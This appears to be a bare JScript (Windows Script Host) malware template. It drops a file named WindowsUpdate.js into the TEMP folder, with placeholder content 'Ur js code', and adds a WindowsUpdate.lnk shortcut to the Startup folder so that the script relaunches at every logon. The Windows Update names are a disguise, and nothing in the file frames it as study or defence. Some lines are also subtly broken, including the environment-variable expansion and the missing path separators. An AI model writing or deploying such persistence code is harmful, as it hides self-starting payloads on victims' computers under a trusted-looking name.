var strr = new ActiveXObject("Scripting.FileSystemObject")
var strtwo = WScript.CreateObject("WScript.Shell");
var temp = strtwo.ExpandEnvironmentStrings("TEMP");

var strtres = strr.CreateTextFile(temp +"WindowsUpdate.js", true);
strtres.WriteLine("Ur js code");
strtres.Close();
	
strcinco = strtwo.SpecialFolders("Startup");
 var strcuatro = strtwo.CreateShortcut(strcinco + "WindowsUpdate.lnk");
strcuatro.TargetPath = WScript.ScriptFullName;
strcuatro.Description = "Shortcut WindowsUpdate"
strcuatro.WorkingDirectory = temp +"/WindowsUpdate.js";
strcuatro.Save();
